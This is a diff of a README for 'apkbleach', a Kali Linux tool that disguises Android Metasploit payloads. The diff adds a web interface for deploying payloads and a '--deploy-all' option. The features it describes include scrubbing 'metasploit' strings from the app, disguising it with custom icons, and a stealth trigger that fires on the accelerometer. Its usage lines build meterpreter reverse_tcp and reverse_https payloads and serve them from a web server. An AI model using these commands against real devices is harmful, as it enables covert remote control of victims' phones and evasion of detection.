@@ -15,27 +15,31 @@ This software was developed specifically for Kali-Linux to obfuscate android pay
 
 **Features:**
 
-1) Line by line permissions editing. The software will go through each permission in the manifest and ask if you want to delete it.
+1) User interface for deployment of payloads
 
-2) Stealth option. This executes the payload off the devices accelerometer instead of on open. This option also allows you to choose how many sessions you want spawned of exploit.
+2) Line by line permissions editing. The software will go through each permission in the manifest and ask if you want to delete it.
 
-3) Custom icon injection. This allows users to modify the app icon that appears on the home screen of a android device. You can choose from a icon apkbleach provides or you can supply your own. Apkbleach will do all the work for you.
+3) Stealth option. This executes the payload off the devices accelerometer instead of on open. This option also allows you to choose how many sessions you want spawned of exploit.
 
-4) Renames the application to the name you put chose as the ouput file
+4) Custom icon injection. This allows users to modify the app icon that appears on the home screen of a android device. You can choose from a icon apkbleach provides or you can supply your own. Apkbleach will do all the work for you.
 
-5) Scrubs the entire application of any mentions of the name "metasploit" , "stage" or "payload". There are a lot by the way. sending security testing with an app that contains the name metasploit is just funny :-)
+5) Renames the application to the name you put chose as the ouput file
 
-6) Adds padnops to PAYLOAD
+6) Scrubs the entire application of any mentions of the name "metasploit" , "stage" or "payload". There are a lot by the way. sending security testing with an app that contains the name metasploit is just funny :-)
 
-7) Signs apk with jarsigner. msfenom produces unsigned apps
+7) Adds padnops to PAYLOAD
 
-8) Zip aligns apk
+8) Signs apk with jarsigner. msfenom produces unsigned apps
 
-9) Apktool upgrade feature. If the software detects youre using apktool version 2.4.1-dirty which is Kali's package maintainers version it will ask if you want to replace it with the lates version frfom ibot peaches. This is a good idea because it conflicts with the msfvenom -x option and throws a version number error. Not to mention the problems it has given users in the past.
+9) Zip aligns apk
+
+10) Apktool upgrade feature. If the software detects youre using apktool version 2.4.1-dirty which is Kali's package maintainers version it will ask if you want to replace it with the lates version frfom ibot peaches. This is a good idea because it conflicts with the msfvenom -x option and throws a version number error. Not to mention the problems it has given users in the past.
 
 **Usage:**
 
     apkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 3 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk
+    
+    apkbleach -g android/meterpreter/reverse_tcp LHOST=address LPORT=port -s 3 --edit-permissions --deploy-all
 
      apkbleach --list-payloads
  
@@ -61,6 +65,8 @@ This software was developed specifically for Kali-Linux to obfuscate android pay
                         Path to output apk
                         
       --edit-permissions    Enables permission editing in apk's manifest
+      
+      --deploy-all          Deploys each available icon as a payload with the apache2 server with a web interface
   
       --list-payloads       List available icons
   
